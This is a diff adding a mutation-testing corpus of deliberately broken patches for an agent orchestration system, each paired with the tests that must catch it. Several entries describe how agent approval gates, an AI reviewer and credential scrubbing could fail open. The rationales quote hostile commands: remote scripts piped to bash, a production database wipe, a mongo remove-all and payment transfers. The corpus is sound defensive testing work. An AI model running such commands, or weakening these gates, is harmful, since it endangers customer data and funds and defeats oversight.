@@ -1,0 +1,288 @@
+# W4-10 — Counterfeit corpus
+#
+# Each entry is executable: apply the patch → run must_fail → assert RED for
+# failure_re → restore. If a counterfeit SURVIVES, that area's suite is
+# decoration and the gate goes red.
+#
+# Seeded with real counterfeits observed in this codebase (see
+# devtasks/TEST-DESIGN-WAVE-4.md W4-10 and the issues register).
+
+[[counterfeit]]
+id = "score-zero-work-special-case"
+patch = "patches/score-zero-work-special-case.patch"
+rationale = "Fakes the O-12 fix by special-casing tasks_done==0 without repairing the empty-set terms or volume dominance."
+must_fail = [
+  "tests/objective/test_score_properties.py::test_more_work_never_scores_lower[one-task-vs-two-tasks]",
+]
+failure_re = "objective prefers|87\\.5 >= 100\\.0"
+
+[[counterfeit]]
+id = "path-startswith-containment"
+patch = "patches/path-startswith-containment.patch"
+rationale = "Replaces the shared inode-ancestry primitive with str.startswith — admits sibling-prefix escapes."
+must_fail = [
+  "tests/api/test_path_containment.py::test_string_prefix_counterfeit_fails_loudly",
+]
+failure_re = "string-prefix containment counterfeit|assert \\(\\) is None"
+
+[[counterfeit]]
+id = "favourable-default-swap"
+patch = "patches/favourable-default-swap.patch"
+rationale = "Swaps one favourable empty-set default for a different favourable default (0.0) instead of representing unknown."
+must_fail = [
+  "tests/tracelab/test_metrics.py::test_empty_denominator_rates_are_unknown_through_row_serialization",
+]
+failure_re = "0\\.0 is None|is None"
+
+[[counterfeit]]
+id = "hardcoded-none-empty-denom"
+patch = "patches/hardcoded-none-empty-denom.patch"
+rationale = "Returns a hardcoded None that is never computed — empty-denominator tests pass, positive denominators go silent."
+must_fail = [
+  "tests/tracelab/test_metrics.py::test_error_streak_and_recovery",
+]
+failure_re = "0\\.75|tool_error_rate|None == 0\\.75|assert None"
+
+[[counterfeit]]
+id = "width-inflation-max-units"
+patch = "patches/width-inflation-max-units.patch"
+rationale = "units = max(units, 5) width inflation — the realistic fan-out failure mode that once passed 10/10."
+must_fail = [
+  "tests/allocation/test_phase1_task_shape_topology.py::test_parallel_sections_sizing",
+]
+failure_re = "worker_count|assert"
+
+[[counterfeit]]
+id = "seq-only-escalation"
+patch = "patches/seq-only-escalation.patch"
+rationale = "Escalation advances nothing (seq can still tick) — a test that only checks seq>0 would pass on broken escalation."
+must_fail = [
+  "tests/simharness/test_orchestration.py::test_attempt_timeout_is_closed_and_escalated",
+]
+failure_re = "timeout did not escalate tier|escalation did not advance model"
+
+[[counterfeit]]
+id = "token-path-copy"
+patch = "patches/token-path-copy.patch"
+rationale = "Copies the production token into the campaign path instead of making both paths resolve the same way."
+must_fail = [
+  "tests/sessions/test_token_isolation.py::test_sim_mode_var_dir_pointing_at_legacy_root_raises",
+  "tests/sessions/test_token_isolation.py::test_sim_mode_legacy_var_case_and_campaign_truth_table[exact]",
+]
+failure_re = "DID NOT RAISE TokenPathError|TokenPathError|production token|refuses"
+
+[[counterfeit]]
+id = "sleep-hides-leak"
+patch = "patches/sleep-hides-leak.patch"
+rationale = "Adds a wall-clock sleep that can mask resource churn instead of exposing steady-state work directly."
+must_fail = [
+  "tests/resource/test_steady_state.py::test_token_load_does_not_sleep_to_mask_resource_churn",
+]
+failure_re = "steady-state token load slept|resource churn"
+
+[[counterfeit]]
+id = "assert-terminal-accepts-failed"
+patch = "patches/assert-terminal-accepts-failed.patch"
+rationale = "Downgrades malformed-JSON recovery from completed to any terminal status, so a failed run is accepted."
+must_fail = [
+  "tests/simharness/test_orchestration.py::test_malformed_provider_json_does_not_kill_run",
+]
+failure_re = "DID NOT RAISE|did not complete the run"
+
+[[counterfeit]]
+id = "cf-draft-exemption-on-active"
+patch = "patches/cf-draft-exemption-on-active.patch"
+rationale = "LOOPS1-E2: keys the draft exemption on missing engine fields instead of status==disabled, so active sparse rows incorrectly pass validation."
+must_fail = [
+  "tests/scheduler/test_routines_meta.py::test_draft_exemption_is_status_keyed_not_missing_fields",
+  "tests/routines/test_validation.py::test_active_sparse_payload_still_rejected",
+]
+failure_re = "DID NOT RAISE|RoutineValidationError|status.keyed|active"
+
+[[counterfeit]]
+id = "cf-enable-mock-harness"
+patch = "patches/cf-enable-mock-harness.patch"
+rationale = "LOOPS1-E7: allows harness=mock through the D5 enable/create activation path."
+must_fail = [
+  "tests/api/test_routine_activation.py::test_enable_fails_closed_on_mock_harness",
+  "tests/api/test_routine_activation.py::test_create_active_with_mock_harness_fails_closed",
+]
+failure_re = "assert 400|status_code == 400|mock"
+
+[[counterfeit]]
+id = "cf-activation-gate-skipped"
+patch = "patches/cf-activation-gate-skipped.patch"
+rationale = "LOOPS1-E6: stubs the activation gate as ok without executing; real exit_code is absent from refusal."
+must_fail = [
+  "tests/api/test_routine_activation.py::test_enable_fails_closed_when_gate_exits_nonzero",
+]
+failure_re = "assert 400|exit_code|status_code == 400"
+
+[[counterfeit]]
+id = "cf-next-run-from-last-fired"
+patch = "patches/cf-next-run-from-last-fired.patch"
+rationale = "LOOPS1-E3: re-derives next_run from last_fired + fixed interval instead of the cron field matcher."
+must_fail = [
+  "tests/scheduler/test_routines_meta.py::test_next_run_not_derived_from_last_fired_interval",
+  "tests/scheduler/test_routines_meta.py::test_next_run_equals_cron_matcher_next_fire",
+]
+failure_re = "assert .*==|10:30|10:10"
+
+[[counterfeit]]
+id = "cf-scope-validation-dropped"
+patch = "patches/cf-scope-validation-dropped.patch"
+rationale = "LOOPS1-E2: drops app-side scope vocabulary validation so bogus scope is accepted."
+must_fail = [
+  "tests/scheduler/test_routines_meta.py::test_scope_rejects_bogus",
+  "tests/api/test_routines_meta.py::test_create_rejects_bogus_scope",
+]
+failure_re = "DID NOT RAISE|RoutineValidationError|status_code == 400|scope"
+
+[[counterfeit]]
+id = "cf-workfs-startswith-containment"
+patch = "patches/workfs-startswith-containment.patch"
+rationale = "Replaces workfs realpath+boundary containment with bare str.startswith — admits sibling-prefix escapes (WORKFS-E1)."
+must_fail = [
+  "tests/workfs/test_containment.py::test_string_prefix_counterfeit_fails_loudly",
+]
+failure_re = "string-prefix containment counterfeit|assert True is False|assert False"
+# workfs is Darwin-kernel-only (renameatx_np); every tests/workfs module is
+# skipif != darwin, so on Linux these nodes execute zero tests (issue #104).
+platforms = ["darwin"]
+
+[[counterfeit]]
+id = "cf-workfs-delete-added"
+patch = "patches/workfs-delete-added.patch"
+rationale = "Introduces os.remove into workfs ensure — create-only charter broken (WORKFS-E2 grep + survival)."
+must_fail = [
+  "tests/workfs/test_ensure.py::test_delete_added_counterfeit_target",
+  "tests/workfs/test_ensure.py::test_create_only_grep_gate",
+]
+failure_re = "create-only charter violated|os\\.remove|seeded file"
+# Same Darwin pin as cf-workfs-startswith-containment (issue #104).
+platforms = ["darwin"]
+
+[[counterfeit]]
+id = "cf-promotion-threshold-inlined"
+patch = "patches/cf-promotion-threshold-inlined.patch"
+rationale = "Inlines D4 min_agreement/min_suggestions in evaluate_promotion so configs/intent_promotion.yaml is no longer the only promotion source (INTENT-E3 / F12)."
+must_fail = [
+  "tests/chats/test_intent_classifier.py::test_promotion_thresholds_read_from_config",
+]
+failure_re = "PROMOTION_PROMOTED|assert .* == .promoted.|promoted"
+
+[[counterfeit]]
+id = "cf-loop-error-behind-event-cap"
+patch = "patches/cf-loop-error-behind-event-cap.patch"
+rationale = "Moves STRICT loop→chat error counting back behind the 50k ASC rate-sample cap so a later disagreement is invisible and D4 zero-tolerance is defeated (sol defect #1)."
+must_fail = [
+  "tests/chats/test_intent_classifier.py::test_strict_loop_error_beyond_rate_cap_still_blocks_promotion",
+]
+failure_re = "STRICT error must be visible|loop_for_chat_errors|assert .*PROMOTION_SHADOW|assert 'shadow'"
+
+[[counterfeit]]
+id = "cf-board-project-clobber"
+patch = "patches/cf-board-project-clobber.patch"
+rationale = "Enrichment breaks if it unconditionally overwrites stored project_id (migration 087) with the run-chain projection (None for cards without runs). Re-pointed at reconcile_board (intake/service.py), the projection behind GET /api/board: the original sabotage sat on GET /api/collab/board's list_board, a duplicate listing of the same table that has since been removed, so the patch no longer applied. Same defect, same board read, the one surviving surface."
+must_fail = [
+  "tests/collab/test_board_company_enrichment.py::TestProjectIdPreservation::test_stored_project_id_not_clobbered_when_no_run_chain",
+]
+failure_re = "Stored project_id must be preserved|assert .* == proj_acme"
+
+[[counterfeit]]
+id = "cf-steward-goals-repointed"
+patch = "patches/cf-steward-goals-repointed.patch"
+rationale = "JG2-BE: repoints the company-goals store at the PRE-EXISTING steward 'goals' table (007_steward.sql) instead of company_goals — the two surfaces are different owners with different schemas, and a suite that only reads back through the store would never notice."
+must_fail = [
+  "tests/goals/test_company_goals.py::test_store_never_touches_steward_goals_table",
+  "tests/goals/test_company_goals.py::test_short_term_with_parent_persists",
+]
+failure_re = "steward goals table|no column named org_company_id|company-goals write reached"
+
+
+[[counterfeit]]
+id = "cf-cap-in-lines-not-bytes"
+patch = "patches/cf-cap-in-lines-not-bytes.patch"
+rationale = "JG3-BE: breaks the transcript size cap by counting newline-delimited records instead of bytes, allowing one newline-free cap+1 payload to reach disk and the database."
+must_fail = [
+  "tests/employee_transcripts/test_storage.py::test_newline_free_exceeds_cap_must_be_refused",
+]
+failure_re = "DID NOT RAISE|exceeds_cap|must_be_refused|bytes|SIZE_CAP"
+
+[[counterfeit]]
+id = "cf-auto-collection-route-added"
+patch = "patches/cf-auto-collection-route-added.patch"
+rationale = "JG3-BE: adds a forbidden chat auto-ingestion endpoint to a surface whose mounted inventory must contain exactly POST upload, GET list, and GET metadata."
+must_fail = [
+  "tests/api/test_employee_transcripts_routes.py::test_mounted_routes_are_exactly_these_three",
+]
+failure_re = "auto|chat|ingest|mounted paths|exactly|found"
+
+[[counterfeit]]
+id = "cf-cap-ignores-metadata"
+patch = "patches/cf-cap-ignores-metadata.patch"
+rationale = "JG3-BE: removes the filename (512B) and meta_json (64KiB) size caps, allowing an 8MB filename or 8MB meta_json to bypass the content cap entirely."
+must_fail = [
+  "tests/employee_transcripts/test_storage.py::test_oversize_metadata_is_refused",
+]
+failure_re = "DID NOT RAISE|SIZE_CAP|filename|meta_json"
+
+[[counterfeit]]
+id = "cf-company-write-unvalidated"
+patch = "patches/cf-company-write-unvalidated.patch"
+rationale = "F-company: drops the org_companies existence check in _resolve_org_company_id (omniagentos/api/routes/projects.py), so a PATCH /api/projects/{id} with an unknown org_company_id id/slug is no longer rejected with a clean 400 -- it falls through to the raw org_companies(id) foreign-key constraint instead, surfacing as the wrong status/error shape (409, jira's conflict message) rather than the documented 400 invalid_org_company_id contract."
+must_fail = [
+  "tests/collab/test_project_company_write.py::test_patch_project_company_unknown_returns_400_and_db_unchanged",
+]
+failure_re = "assert 409 == 400|invalid_org_company_id"
+
+[[counterfeit]]
+id = "cf-approval-classifier-renarrowed"
+patch = "patches/cf-approval-classifier-renarrowed.patch"
+rationale = "H1: re-narrows omniagentos/orchestrator/approvals.py::_classify_request back to the finite English keyword list — drops the ORM/driver idioms, the plain-English destructive verbs, the payment-rail nouns, AND short-circuits _durable_write_floor to None. This is the exact pre-hardening shape in which `wipe /srv/prod/customer_database`, `zelle send 500 to X`, `mongo --eval \"db.customers.remove({})\"` and `topup --wallet customer amount 500` all auto-approved on the live hands-off path. The 24 true-negative rows of the golden corpus stay GREEN under this mutation, which is what proves the corpus is measuring the floor and not simply parking everything."
+must_fail = [
+  "tests/orchestrator/test_approvals_golden_corpus.py::test_evasion_matrix_row_parks",
+  "tests/orchestrator/test_approvals_golden_corpus.py::test_durable_floor_parks_rows_no_keyword_list_matches",
+]
+failure_re = "AUTO-APPROVED a request that must park|only the durable floor can park"
+
+[[counterfeit]]
+id = "cf-reviewer-fails-open"
+patch = "patches/cf-reviewer-fails-open.patch"
+rationale = "H2: restores the default-CONFIRM path in omniagentos/orchestrator/review.py by making _infrastructure_error return verdict='confirm' with 'passed by default'. That single edit re-opens all three fail-open sites at once (adapter raise, unparseable payload, unrecognised verdict string), which is how a logged-out or quota-dead reviewer CLI silently approved every orchestration it was asked to judge."
+must_fail = [
+  "tests/orchestrator/test_review_fails_closed.py::test_each_infrastructure_failure_mode_is_error_never_confirm",
+  "tests/orchestrator/test_review_fails_closed.py::test_parse_verdict_never_coerces_an_unknown_string_to_confirm",
+  "tests/acceptance/test_17_control_plane.py::TestPassRulesAndPosture::test_orchestrator_review_failure_does_not_confirm",
+]
+failure_re = "must never CONFIRM|failed OPEN to confirm|coerced to confirm|assert 'confirm' == 'error'"
+
+[[counterfeit]]
+id = "cf-review-error-treated-as-confirm"
+patch = "patches/cf-review-error-treated-as-confirm.patch"
+rationale = "H2 (loop seat): leaves review.py fail-closed but makes omniagentos/orchestrator/core.py upgrade verdict='error' to a confirm instead of blocking — the realistic 'a blocked task wedges the run, just let it pass' regression. Without this entry the reviewer contract is bound only at the unit level and the orchestration loop could re-open the hole while review.py still looks correct."
+must_fail = [
+  "tests/orchestrator/test_review_fails_closed.py::test_reviewer_infra_failure_blocks_and_retries_exactly_once",
+]
+failure_re = "a dead reviewer must block, never confirm|blocked_on_review"
+
+[[counterfeit]]
+id = "cf-gate-env-unscrubbed"
+patch = "patches/cf-gate-env-unscrubbed.patch"
+rationale = "H3(b): drops env=_scrubbed_env() from omniagentos/gates/engine.py::run_gates, so a PLANNER-AUTHORED verification command again inherits the operator's full environment — every payment/bank/infra credential, provider API key, admin DSN and OPERATOR_TOKEN. The must_fail assertions are made on the FAR SIDE (the child process prints its own os.environ), so a test that merely inspected the call arguments could not catch this."
+must_fail = [
+  "tests/gates/test_engine_env_scrub.py::test_gate_subprocess_cannot_see_operator_secrets",
+  "tests/gates/test_engine_env_scrub.py::test_unknown_non_credential_vars_are_also_dropped",
+]
+failure_re = "gate subprocess inherited|SOME_VENDOR_UNGUESSABLE_VALUE"
+
+[[counterfeit]]
+id = "cf-opaque-payload-executes"
+patch = "patches/cf-opaque-payload-executes.patch"
+rationale = "Sol review blocker A: removes the interpreter-shape rule from omniagentos/orchestrator/approvals.py::_classify_request, so content whose body is not statically visible is again handed to an interpreter unexamined — `curl https://x.sh | bash`, `base64 -d <<< '...' | bash`, `cat blob.txt | bash`, `bash -c \"$(curl ...)\"`, `. <(curl ...)` and `source /tmp/fetched.sh` all auto-approve. This is the defect CLASS, not three strings: no text matcher can see inside the payload, so a decoder denylist would only move the hole to the next encoding. The must_fail matrix covers 10 producers x 8 interpreters (one producer is an invented tool name, so a denylist-shaped 'fix' cannot make it green)."
+must_fail = [
+  "tests/orchestrator/test_approvals_golden_corpus.py::test_every_opaque_producer_into_every_interpreter_parks",
+  "tests/orchestrator/test_approvals_golden_corpus.py::test_the_rule_is_not_a_decoder_denylist",
+  "tests/orchestrator/test_approvals_golden_corpus.py::test_evasion_matrix_row_parks",
+]
+failure_re = "opaque payload reached an interpreter|AUTO-APPROVED a request that must park"
